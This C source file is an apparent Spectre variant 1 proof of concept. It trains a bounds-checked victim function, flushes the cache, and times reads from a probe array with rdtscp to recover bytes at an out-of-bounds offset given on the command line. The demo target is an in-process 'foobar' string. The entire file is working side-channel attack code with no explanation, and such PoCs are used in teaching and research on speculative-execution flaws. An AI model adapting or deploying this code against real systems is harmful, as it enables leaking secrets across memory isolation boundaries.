#include <stdio.h>
#include <sys/mman.h>
#include <stdlib.h>

#define THRESHOLD 100

void flush(void *p);
uint64_t rdtsc();
void leak(size_t x, size_t *ret);

inline
void
flush(void *p)
{
	__asm__ volatile ("clflush 0(%0)" : : "r" (p) : "rax");
}

inline
uint64_t
rdtsc()
{
	uint64_t a, d;
	__asm__ volatile ("rdtscp" : "=a" (a), "=d" (d));
	a = (d<<32) | a;
	return a;
}

size_t array1_size = 15;
uint8_t array1[16] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,42};
uint8_t *array2, temp;

char secret[] = {'f','o','o','b','a','r'};

void
victim_function(size_t x)
{
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 4096];
	}
}

void
leak(size_t x, size_t *ret)
{
	int i = 0, j = 0, k = 0, index = 0, res;
	size_t delta, time, junk;
	for (k = 0; k < 256; k++)
	{
		flush (&array2[k * 4096]);
	}
	for (i = 0; i < 16; i++)
	{
		index = !(i ^ 15) * x;
		//printf ("%d %d\n", i, index);
		flush (&array1_size);
		victim_function (index);
		if (i == 15)
		{
			for (j = 1; j < 256; j++)
			{
				time = rdtsc();
				junk = array2[4096 * j];
				delta = rdtsc() - time;
				//printf ("off=%d time=%zu\n", j, delta);
				if (delta < THRESHOLD)
				{
					*ret = j;
					break;
				}
			}
		}
	}
}

int
main(int argc, char **argv)
{
	size_t x = 15, val = 0;
	int i = 0, len = 1;

	// page aligned with mmap
	array2 = mmap (NULL, 256 * 4096, PROT_READ|PROT_WRITE,
					MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

	// initialize probing array
	for (i = 0; i < 256; i++)
	{
		array2[i * 4096] = 0;
	}

	// input
	if (argc > 1)
	{
		x = atoi(argv[1]);
	}
	if (argc > 2)
	{
		len = atoi(argv[2]);
	}

	// leak data
	printf ("Reading %d bytes at %zu:\n", len, x);
	for (i = 0; i < len; i++)
	{
		leak (x+i, &val);
		printf("offset=%zu byte=%zu 0x%zx '%c'\n", x+i, val, val, (char)val);
	}

	munmap (array2, 256 * 4096);
	return 0;
}
